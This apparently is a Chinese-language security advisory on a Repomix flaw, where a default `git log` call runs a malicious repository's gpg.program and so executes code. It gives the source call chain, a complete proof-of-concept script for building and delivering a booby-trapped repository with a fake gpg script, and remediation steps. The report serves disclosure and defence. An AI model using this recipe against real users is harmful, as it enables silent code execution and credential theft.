---
title: "Repomix 漏洞报告：不可信 Git 配置导致任意代码执行"
date: 2026-10-20 00:00:00
categories:
  - 漏洞研究
tags:
  - Repomix
  - Git
  - RCE
  - GHSA-4p5g-gh74-q524
description: 分析 Repomix 默认 Git 变更排序流程中的信任边界问题，以及不可信仓库配置触发代码执行的调用链、复现过程与修复建议。
cover: /images/repomix-report.png
---

## Summary
repomix 是一款把仓库打包成单文件的工具。由于合并配置中 output.git.sortByChanges 默认为开启（src/config/configSchema.ts:151），每次本地打包都会在工作目录内执行 `git log`。被拉起的 git 子进程会读取仓库级 .git/config——当目录来自不可信来源时该配置完全由攻击者控制。攻击者在 .git/config 中写入 [log] showSignature=true 与 `[gpg] program=<可执行文件>`，并用伪 gpg 预先签出一个带 gpgsig 头的 commit，即可让 git log 调用 gpg.program，以 repomix 进程权限执行任意命令。该漏洞位于默认代码路径，无需任何 flag 或确认，且文档未声明此风险（文档只把 repomix.config.* 与 input.processors 声明为与 npm script 相同的信任边界）。repomix 精确调用的 git 命令（`git -C <dir> log --pretty=format: --name-only -n 100`）已在沙箱（git 2.39.5）中动态验证：伪 gpg 脚本以 uid=0 被调用并写入了 RCE 证据文件。

## Details
根因：repomix 在不可信目录内拉起 git 子进程时，把仓库级 Git 配置（.git/config）当作可信输入，未做任何隔离或覆盖。Git 自身会遵循 .git/config 中的可执行配置键（如 gpg.program、diff.external、core.pager、core.sshCommand、core.fsmonitor、filter/textconv 驱动等）。恶意仓库因此可以劫持默认运行的 git log 调用。

信任边界失败点：打包流程只把 repomix.config.* 与 input.processors 视为可执行仓库内容（有门控与文档声明），但默认的 git 子进程调用会读取用户从不检查、文档也未提及的 .git/config，并执行其中的 gpg.program 值。

入口到危险操作的完整链路（逐跳源码确认）：

1. src/config/configSchema.ts:151 — `sortByChanges: v.optional(v.boolean(), true)` 使 git 变更排序默认开启。
2. src/core/packager.ts:97-101 — pack() 每次打包都会调用 deps.prefetchSortData(config)。
3. src/core/output/outputSort.ts:121-130 — prefetchSortData() 转发到 getFileChangeCounts(config.cwd, sortByChangesMaxCommits)，其中 config.cwd 是用户运行 repomix 的目录（CLI 下为 process.cwd()，见 src/cli/cliRun.ts:258）。
4. src/core/output/outputSort.ts:43-90 — checkGitAvailability() 确认 cwd/.git 存在（恶意仓库满足），随后执行 getFileChangeCount(cwd, maxCommits)。
5. src/core/git/gitRepositoryHandle.ts:4-25 — getFileChangeCount() 调用 execGitLogFilenames(directory, maxCommits)。
6. src/core/git/gitCommand.ts:29-37 — execFileAsync('git', ['-C', directory, 'log', '--pretty=format:', '--name-only', '-n', maxCommits.toString()]) 在不可信仓库内执行 git log。
7. git 读取 directory/.git/config，应用 [log] showSignature=true，对每个带 gpgsig 头的 commit 调用 [gpg] program=./scripts/evil.sh（由于 -C，相对路径相对仓库根解析）。攻击者用伪 gpg 签名（git -c gpg.program=./scripts/evil.sh commit -S）预先产生这样的 commit。

execFile 的参数数组避免了经典 shell 注入，但这无济于事：注入由 git 自身在遵循攻击者控制配置时完成。动态验证：`git -C /tmp/gitattack2 log --pretty=format: --name-only -n 100` 以参数 --keyid-format=long --status-fd=1 --verify ... 调用了 gpg.program，脚本以 uid=0 执行并写入 'RCE-VIA-RELATIVE-GPG: uid=0 cwd=/tmp/gitattack2'。若 commit 不含 gpgsig 头，git 完全跳过 GPG，因此攻击者预先签名 commit 以满足该条件。

Core vulnerable code path:

```typescript
// src/config/configSchema.ts:150-156
git: v.object({
      sortByChanges: v.optional(v.boolean(), true),
      sortByChangesMaxCommits: v.optional(v.pipe(v.number(), v.integer(), v.minValue(1)), 100),
      includeDiffs: v.optional(v.boolean(), false),
      includeLogs: v.optional(v.boolean(), false),
      includeLogsCount: v.optional(v.pipe(v.number(), v.integer(), v.minValue(1)), 50),
    }),
```

sortByChanges 默认为 true，使每次本地打包都在无任何显式选择的情况下静默启用 git 变更排序，从而在工作目录执行 git log。这是信任边界失败点：用户从未同意执行任何代码，默认却拉起了受仓库控制的 git 子进程。

```typescript
// src/core/output/outputSort.ts:121-130
export const prefetchSortData = async (
  config: RepomixConfigMerged,
  deps: SortDeps = {
    getFileChangeCount,
    isGitInstalled,
  },
): Promise<void> => {
  if (!config.output.git?.sortByChanges) return;
  await getFileChangeCounts(config.cwd, config.output.git?.sortByChangesMaxCommits, deps);
};
```

pack() 启动时调用 prefetchSortData(config)（src/core/packager.ts:99）。config.cwd 是受害者运行 repomix 的目录；getFileChangeCounts 后续到达 execGitLogFilenames，把默认运行链接到会遵循恶意 .git/config 的 git log 子进程。

```typescript
// src/core/git/gitCommand.ts:29-37
const result = await deps.execFileAsync('git', [
      '-C',
      directory,
      'log',
      '--pretty=format:',
      '--name-only',
      '-n',
      maxCommits.toString(),
    ]);
```

危险 sink：`git -C <directory> log` 在不可信仓库内执行。git 读取 directory/.git/config；当存在 [log] showSignature=true、[gpg] program=./scripts/evil.sh 且 commit 带 gpgsig 头时，git 调用 gpg.program——以 repomix 进程权限执行任意命令。已在 git 2.39.5 动态验证（uid=0，相对路径相对仓库根解析）。

```typescript
// src/core/git/gitRepositoryHandle.ts:4-25
export const getFileChangeCount = async (
  directory: string,
  maxCommits = 100,
  deps = {
    execGitLogFilenames,
  },
): Promise<Record<string, number>> => {
  try {
    const filenames = await deps.execGitLogFilenames(directory, maxCommits);

    const fileChangeCounts: Record<string, number> = {};

    for (const filename of filenames) {
      fileChangeCounts[filename] = (fileChangeCounts[filename] || 0) + 1;
    }

    return fileChangeCounts;
  } catch (error) {
    logger.trace('Failed to get file change counts:', (error as Error).message);
    return {};
  }
};
```

中间一跳：getFileChangeCount 把受害者目录（恶意仓库根目录）直接传给 execGitLogFilenames，完成默认链 config.cwd -> git log -> gpg.program。

## POC
前置条件：

+ 受害者机器装有 git（repomix 的 git 变更排序依赖）。
+ 攻击者能向受害者交付一个含自身 .git 的完整仓库目录（如 zip 压缩包、共享目录或内部拷贝）。
+ 受害者在仓库根目录运行 repomix，且未显式设置 output.git.sortByChanges=false。

复现步骤（攻击者侧）：

1. 构建恶意仓库：

```bash
git init evil-repo && cd evil-repo
echo x > a.txt && git add a.txt && git -c user.email=a@b.c -c user.name=t commit -qm init
mkdir -p scripts && cat > scripts/evil.sh <<'EOF'
#!/bin/sh
id > /tmp/pwned
echo "[GNUPG:] NEWSIG" >&2
echo "[GNUPG:] SIG_CREATED D 1 8 1700000000 0" >&2
echo "-----BEGIN PGP SIGNATURE-----\niQEvBAABCAAX\n=AAAA\n-----END PGP SIGNATURE-----"
EOF
chmod +x scripts/evil.sh && git add scripts/evil.sh
git -c user.email=a@b.c -c user.name=t -c gpg.program=./scripts/evil.sh commit -qm signed -S
cat > .git/config <<'CONF'
[log]
showSignature = true
[gpg]
program = ./scripts/evil.sh
CONF
cd .. && zip -r evil-repo.zip evil-repo
```

此时 commit 带 gpgsig 头（git cat-file commit HEAD | grep gpgsig），.git/config 含恶意键。
2. 把 evil-repo.zip 交付给受害者。

复现步骤（受害者侧）：  
3. 解压仓库并运行 repomix：

```bash
unzip evil-repo.zip && cd evil-repo && repomix
```

   预期结果：repomix 正常打包并写出 repomix-output.xml，同时恶意 gpg.program 在后台以受害者权限执行。  
4. 验证：cat /tmp/pwned 显示 id 输出（如 uid=0(root)），证明 scripts/evil.sh 被 git log 通过 gpg.program 调用。

审计沙箱中已执行的等价现场验证：`git -C /tmp/gitattack2 log --pretty=format: --name-only -n 100`（与 gitCommand.ts:29-37 完全一致的命令）触发脚本并写入 'RCE-VIA-RELATIVE-GPG: uid=0 cwd=/tmp/gitattack2'。

## Impact
远程代码执行（RCE）：攻击者让受害者在攻击者提供的仓库目录中运行 repomix（默认行为、无需任何 flag），即可用 repomix 进程（即调用用户）的权限执行任意命令。实际危害包括反弹 shell、持久化后门、窃取受害者环境中的凭证，以及在共享/CI 环境中的横向移动。由于利用的是默认开启的代码路径，受害者没有任何可见的同意步骤——用户只意图读取并打包仓库内容。漏洞已动态验证（git 2.39.5，以 uid=0 执行）。

## Remediation
1. 对所有 git 子进程调用覆盖/禁用不可信仓库配置：在 git log/diff 调用前加 `-c log.showSignature=false`（或 --no-show-signature）与 `-c gpg.program=git`（或等效安全值），使仓库级 [log]/[gpg] 键无法重定向执行。
2. 更彻底：以加固环境运行 git 子进程，设置 GIT_CONFIG_NOSYSTEM=1，并显式覆盖不可信 .git/config 可能设置的所有可执行键——gpg.program、diff.external、core.pager、core.sshCommand、core.fsmonitor、filter.*、textconv 驱动、core.hooksPath。
3. 对不可信仓库（--remote 克隆及用户指定的外部目录）优先使用 `git --no-optional-locks -c log.showSignature=false`，并尽可能避免在不可信工作树内运行 git 命令。
4. 显式声明信任边界：在不可信来源的仓库内运行 repomix 会执行仓库级 git 配置（gpg.program 及相关键），并提供 --no-git 标志或配置项以完全禁用 git 子进程。
